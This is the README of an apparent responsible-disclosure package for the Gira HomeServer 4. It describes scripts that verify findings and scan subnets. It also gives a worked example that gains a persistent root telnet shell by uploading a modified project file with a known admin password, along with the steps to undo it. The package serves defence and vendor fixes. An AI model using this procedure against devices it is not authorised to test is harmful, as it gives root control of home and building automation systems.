# Gira HomeServer 4: security findings package

One report, three scripts, one example transcript. Device identifiers are written
as placeholders (`<hs4-ip>`, `<serial>`), so no file here identifies a person, site
or device.

## Why this exists

Responsible disclosure meant as help. The findings are reported so the vendor and
other owners can fix them. The verify scripts only read from the device:
they send no KNX writes, upload nothing, flash nothing. Run them only on devices you
are allowed to test.

## Files

| File | Purpose |
|------|---------|
| `REPORT.md` | The findings A–F, each with cause, code location and fix. Start here. |
| `hs4_poc_verify.py` | Checks one device. Read-only. Safe on a running system. |
| `hs4_scan.py` | Same checks over several hosts or a subnet, with JSON output. |
| `hsadmin.py` | Talks to the `/HSADMIN` endpoint: `--probe` checks the password path, `--rollback` restores a saved project. Used in the shell example below. |
| `evidence-example.txt` | Transcript of a real run against the test device, SHA-256 stamped. |

Needs Python 3 only. No packages. If raw sockets are blocked (macOS asks about local
network access), the scripts use `/usr/bin/nc` instead.

## Verify a device

```
python3 hs4_poc_verify.py --host <hs4-ip> --user admin --out evidence.txt
python3 hs4_scan.py <hs4-ip>                       # one device
python3 hs4_scan.py 192.168.1.0/24 --json out.json # whole subnet
```

Each device gets one line, e.g. `findings[ABCD]=A.CD`. `hs4_scan.py` writes full
results to the JSON file given by `--json`.

## Gain a root shell: worked example

You need the admin password. Back up the current project first; `hsadmin.py --rollback`
takes any `prg.dat` file you point it at, which is how you both install and undo.

Prepare once, keep both copies: export the current project from Gira Expert (or the
vendor tool) so it ends up as `work/prg.dat`, then:

```
cp work/prg.dat work/prg.dat.original
```

Then add the three lines from REPORT.md ("Getting a shell, step by step") to the logic
section of `work/prg.dat`. Now upload it and log in:

```
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --probe                      # password path works?
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --version 146 --rollback work/prg.dat
telnet <hs4-ip> 2323                       # about 100 s after the upload
```

Expected: `--probe` prints `PASSWORD ACCEPTED`, the upload prints the accepted ZIP
entries, then `id` inside telnet answers `uid=0(root) gid=0(root)`. The shell comes
back on every boot, so remove it when done:

```
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --version 146 --rollback work/prg.dat.original
```

`killall telnetd` inside the shell removes it until the next reboot.

## In short

`hs_main` runs as root and evaluates project code as root; both firmware update paths
skip signature and checksum checks. The most important fix is signing the firmware
images. Finding A is a one-line fix.
